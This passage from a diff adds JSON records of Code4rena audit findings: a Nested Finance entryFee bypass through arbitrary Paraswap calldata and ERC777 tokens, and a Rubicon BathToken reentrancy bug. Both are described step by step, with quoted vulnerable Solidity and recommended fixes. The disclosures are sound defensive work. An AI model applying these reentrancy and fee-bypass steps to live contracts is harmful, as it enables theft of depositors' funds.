passed to Paraswap. Since the operator will check the balance of USDC, it looks like we've swapped 1 wei ETH for 1,000,000 USDC.\n*   The Paraswap operator returns the swap amounts back to Nested Factory.\n*   Nested Factory deposits the 1,000,000 USDC to the vault for the user without charging any `entryFee`.\n\nNOTE: I use 1 wei as an extreme example. You would have to ensure that you're swapping at least enough to receive 1 wei of the ERC777 to transfer to the attack contract.\n\n### Recommended Mitigation Steps\n\nAllowing a user to pass arbitrary call data to a router is risky because routers allow several paths for an attacker to gain control of execution. Originally, I believed this exploit to be possible simply by swapping to ETH, which would perform an external call to the `beneficiary`, but Paraswap actually only forwards 10,000 gas when performing ETH transfers. If Nested plans to include a vanilla Uniswap router operator, this would be an issue. Here is the Paraswap transfer logic:\n\n    function transferTokens(\n            address token,\n            address payable destination,\n            uint256 amount\n        )\n        internal\n        {\n            if (amount > 0) {\n                if (token == ETH_ADDRESS) {\n                    (bool result, ) = destination.call{value: amount, gas: 10000}(\"\");\n                    require(result, \"Failed to transfer Ether\");\n                }\n                else {\n                    IERC20(token).safeTransfer(destination, amount);\n                }\n            }\n\n        }\n\nTherefore, it might be worth exploring the option of allowing the user to only choose from a list of predefined function signatures when making calls to Paraswap. The final `Order` param that is passed to the operator would be built within the contract by concatenating the function, input, and output tokens. Even then, if the output token truly is an ERC777, the user would be able to intercept control and directly transfer more of the ERC777.\n\nA large-scale fix would be to charge the entry fee on the amount of output tokens after performing the swap. I'm not sure if this falls in line with Nested's plans though.\n\n**[maximebrugel (Nested) acknowledged](https://github.com/code-423n4/2022-06-nested-findings/issues/69)**\n\n**[Jack the Pug (judge) commented](https://github.com/code-423n4/2022-06-nested-findings/issues/69#issuecomment-1183919165):**\n > I find this to be a valid Medium issue. I have a few things to add:\n> \n> 1. It applies not only to the ParaSwap operator but also the other operators, ie, 0x;\n> 2. Not just the `entryFee`, the `exitFees` can also be bypassed in a similar way;\n> 3. Not necessarily using a ERC777, the attacker can also use a malicious ERC20 they deployed on their own;\n> \n> The root cause is that:\n> \n> `entryFee` and `exitFees` should be charged on the token that gets in and out the `Reserve`, not the inputToken/outputToken of the swap.\n\n\n\n***\n\n",
+      "summary": "\nThis bug report concerns a vulnerability in the NestedFactory contract, which is part of a code repository on GitHub. The vulnerability allows a user to bypass the “entryFee” collection when using the NestedFactory.create() function. This is done by passing in arbitrary calldata when using the ParaSwap router. This allows the user to swap from a miniscule amount of input token to an ERC777 with themselves as the recipient. The amount of output token returned to the contract via the direct transfer from the user will then be deposited in the vault without charging any entry fee.\n\nThe recommended mitigation steps for this issue include allowing the user to only choose from a list of predefined function signatures when making calls to Paraswap. Alternatively, the entry fee could be charged on the amount of output tokens after performing the swap.",
+      "report_date": {},
+      "contest_prize_txt": "$35,000 USDC",
+      "contest_link": "https://code4rena.com/contests/2022-06-nested-finance-contest",
+      "sponsor_name": "Nested Finance",
+      "sponsor_link": "https://twitter.com/NestedFinance",
+      "quality_score": 0,
+      "general_score": 0,
+      "source_link": "https://code4rena.com/reports/2022-06-nested",
+      "github_link": "https://github.com/code-423n4/2022-06-nested-findings/issues/69",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "137",
+      "slug": "m-01-user-can-bypass-entryfee-by-sending-arbitrary-calldata-to-paraswap-operator-code4rena-nested-finance-nested-finance-contest-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Nested Finance",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Nested Finance",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "CDP"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Services"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Cross Chain"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Reentrancy"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "ERC777"
+          }
+        }
+      ]
+    },
+    {
+      "id": "2497",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "HIGH",
+      "finders_count": 1,
+      "protocol_id": "216",
+      "title": "[H-10] BathToken.sol#_deposit() attacker can mint more shares with re-entrancy from hookable tokens",
+      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557-L568\n\n\n## Vulnerability details\n\n`BathToken.sol#_deposit()` calculates the actual transferred amount by comparing the before and after balance, however, since there is no reentrancy guard on this function, there is a risk of re-entrancy attack to mint more shares.\n\nSome token standards, such as ERC777, allow a callback to the source of the funds (the `from` address) before the balances are updated in `transferFrom()`. This callback could be used to re-enter the function and inflate the amount.\n\nhttps://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557-L568\n\n```solidity\nfunction _deposit(uint256 assets, address receiver)\n    internal\n    returns (uint256 shares)\n{\n    uint256 _pool = underlyingBalance();\n    uint256 _before = underlyingToken.balanceOf(address(this));\n\n    // **Assume caller is depositor**\n    underlyingToken.transferFrom(msg.sender, address(this), assets);\n    uint256 _after = underlyingToken.balanceOf(address(this));\n    assets = _after.sub(_before); // Additional check for deflationary tokens\n    ...\n```\n\n### PoC\n\nWith a ERC777 token by using the ERC777TokensSender `tokensToSend` hook to re-enter the `deposit()` function.\n\nGiven: \n\n-   `underlyingBalance()`: `100_000e18 XYZ`.\n-   `totalSupply`: `1e18`\n\nThe attacker can create a contracts with `tokensToSend()` function, then:\n\n1.   `deposit(1)`\n    -   preBalance  = `100_000e18`;\n    -   `underlyingToken.transferFrom(msg.sender, address(this), 1)`\n2. reenter using `tokensToSend` hook for the 2nd call: `deposit(1_000e18)`\n    -   preBalance  = `100_000e18`;\n    -   `underlyingToken.transferFrom(msg.sender, address(this), 1_000e18)`\n    -   postBalance = `101_000e18`;\n    -   assets (actualDepositAmount) = `101_000e18 - 100_000e18 = 1_000e18`;\n    -   mint `1000` shares;\n3. continue with the first `deposit()` call:\n    -   `underlyingToken.transferFrom(msg.sender, address(this), 1)`\n    -   postBalance = `101_000e18 + 1`;\n    -   assets (actualDepositAmount) = `(101_000e18 + 1) - 100_000e18 = 1_000e18 + 1`;\n    -   mint `1000` shares;\n\nAs a result, with only `1 + 1_000e18` transferred to the contract, the attacker minted `2_000e18 XYZ` worth of shares.\n\n### Recommendation\n\nConsider adding `nonReentrant` modifier from OZ's `ReentrancyGuard`.",
+      "summary": "\nThis bug report is about a vulnerability in the code of the BathToken.sol#_deposit() function, which is part of the 2022-05-rubicon project. This function calculates the amount of funds transferred by comparing the before and after balance, but since there is no reentrancy guard on this function, it is vulnerable to a re-entrancy attack. This attack can be used to mint additional shares in the project.\n\nA proof-of-concept of this attack is provided in the report. It explains how an attacker can use a ERC777 token and the ERC777TokensSender `tokensToSend` hook to re-enter the `deposit()` function and inflate the amount. After transferring only `1 + 1_000e18` to the contract, the attacker can mint `2_000e18 XYZ` worth of shares.\n\nThe report recommends adding the `nonReentrant` modifier from OZ's `ReentrancyGuard` to protect the project from this vulnerability.",
+      "report_date": {},
+      "contest_prize_txt": "$50,000 USDC",
+      "contest_link": "https://code4rena.com/contests/2022-05-rubicon-contest",
+      "sponsor_name": "Rubicon",
+      "sponsor_link": "https://twitter.com/rubicondefi",
+      "quality_score": 4,
+      "general_score": 4,
+      "source_link": "https://code4rena.com/reports/2022-05-rubicon",
+      "github_link": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/350",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "129",
+      "slug": "h-10-bathtokensol_deposit-attacker-can-mint-more-shares-with-re-entrancy-from-hookable-tokens-code4rena-rubicon-rubicon-contest-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Rubicon",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Rubicon",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "CDP"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield Aggregator"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "RWA"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "ERC777"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Reentrancy"
+          }
+        }
+      ]
+    }
+  ]
+}
